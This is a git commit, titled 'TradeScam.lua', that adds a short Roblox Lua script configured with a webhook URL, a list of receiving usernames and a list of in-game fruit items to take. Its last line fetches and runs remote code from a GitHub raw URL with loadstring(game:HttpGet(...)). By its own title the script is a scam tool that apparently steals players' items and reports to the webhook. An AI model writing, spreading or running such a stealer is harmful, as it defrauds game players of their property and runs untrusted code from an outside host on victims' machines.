55013dd238c2731ab9f2bab73835dc2775961da1
OfficialRedz <minecraft2627889@gmail.com>
2025-03-21 18:42:24 +0530

    TradeScam.lua

---
+++ Trade.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RVV3dDFoOFhWVnZTQjV1Ujk0QjlJdzpjTWxjZWZNS2E0cXctdUZENFZkcG8xMXYyc3JyTHczMGtoTU43NDFodkFQNl9mOUFrU1FzSTBqSHc4V0ZoR0ZyT2tCR2c4UkQyM25xWDhMRVMtNGdLRTdReUxRTGpsd2IyUFFMVnNZUlRwLUIzZU9McV9ibkJyd0Uwelo0WURleW1fZWxuZlNjV3JmdnBRTWtMRXZGMWFBS3NuaFRLRDNyVmlMTUFjSTJIV2s" -- << Your Webhook
+Usernames = {"Keshav6342", "miguelpaguia1", "SmashClap10", "IsmashClap10", "Base6383"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
